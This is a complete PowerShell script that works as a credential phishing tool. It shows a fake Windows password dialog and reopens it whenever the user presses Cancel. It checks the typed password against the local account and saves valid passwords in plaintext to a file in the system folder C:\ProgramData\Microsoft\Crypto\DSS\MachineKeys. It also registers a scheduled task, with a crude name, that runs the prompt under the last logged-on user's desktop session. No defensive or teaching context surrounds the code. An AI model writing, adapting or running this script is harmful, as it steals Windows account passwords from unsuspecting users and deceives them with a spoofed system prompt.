Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

function Show-PasswordPrompt {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Password Authentication"
    $form.Size = New-Object System.Drawing.Size(300,150)
    $form.StartPosition = "CenterScreen"

    $username = [Environment]::UserName

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Enter your password:"
    $label.Location = New-Object System.Drawing.Point(10,20)
    $label.Size = New-Object System.Drawing.Size(280,20)
    $form.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(10,40)
    $textBox.Size = New-Object System.Drawing.Size(265,20)
    $textBox.UseSystemPasswordChar = $true
    $form.Controls.Add($textBox)

    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Location = New-Object System.Drawing.Point(10,70)
    $okButton.Size = New-Object System.Drawing.Size(75,23)
    $okButton.Text = "OK"
    $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $form.AcceptButton = $okButton
    $form.Controls.Add($okButton)

    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Location = New-Object System.Drawing.Point(95,70)
    $cancelButton.Size = New-Object System.Drawing.Size(75,23)
    $cancelButton.Text = "Cancel"
    $cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
    $form.CancelButton = $cancelButton
    $form.Controls.Add($cancelButton)

    $result = $form.ShowDialog()

    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        $password = $textBox.Text
        Validate-Credentials -username $username -password $password
    } elseif ($result -eq [System.Windows.Forms.DialogResult]::Cancel) {
        Write-Host "Operation canceled by the user."
        Write-Host "trying again"
        Show-PasswordPrompt
    }

    $form.Dispose()
}

function Validate-Credentials {
    param(
        [string]$username,
        [string]$password
    )
    $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
    try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType)
        $isValid = $principalContext.ValidateCredentials($username, $password)
        if ($isValid) {
            Write-Host "Authentication successful."
            $directoryPath = "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys"
            $fileName = "output.txt"
            $content = $password
            Output-File -directoryPath $directoryPath -fileName $fileName -content $content
        } else {
            Write-Host "Authentication failed. Please try again."
            Show-PasswordPrompt
        }
    } catch {
        Write-Host "An error occurred: $_"
    }
}

function Output-File {
    param(
        [string]$directoryPath,
        [string]$fileName,
        [string]$content
    )

    # Ensure the directory exists
    if (-Not (Test-Path -Path $directoryPath)) {
        New-Item -ItemType Directory -Path $directoryPath -Force
    }

    $filePath = Join-Path -Path $directoryPath -ChildPath $fileName
    $content | Out-File -FilePath $filePath -Encoding UTF8
}


function Schedule-PowerShellScript {
    param(
        [string]$ScriptPath,
        [string]$UserName,
        [string]$TaskName
    )

    # Calculate the trigger time (10 seconds from now)
    $triggerTime = (Get-Date).AddSeconds(10)

    # Create a trigger for the scheduled task
    $trigger = New-ScheduledTaskTrigger -At $triggerTime -Once

    # Define the action to run PowerShell and execute the script
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$ScriptPath`""

    # Specify the user context under which the task should run
    $principal = New-ScheduledTaskPrincipal -UserId $UserName -LogonType Interactive

    # Register the scheduled task
    Register-ScheduledTask -TaskName $TaskName -Trigger $trigger -Action $action -Principal $principal -Force

    # Output the scheduled time
    Write-Output "Task '$TaskName' scheduled to run at: $triggerTime"
}

# Function to check if the task exists and call the scheduling function if it does not
function CheckAndScheduleTask {
    param(
        [string]$ScriptPath,
        [string]$UserName,
        [string]$TaskName
    )

    # Check if the scheduled task already exists
    $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $existingTask) {
        Write-Output "No existing task found with the name '$TaskName'. Proceeding to schedule new task."
        Schedule-PowerShellScript -ScriptPath $ScriptPath -UserName $UserName -TaskName $TaskName
        exit
    } else {
        Write-Output "A task with the name '$TaskName' already exists. No action taken."
    }
}



$activeUser = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI").LastLoggedOnUser
CheckAndScheduleTask -ScriptPath "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1" -UserName $activeUser -TaskName "automated-ballsack-licker"

Show-PasswordPrompt
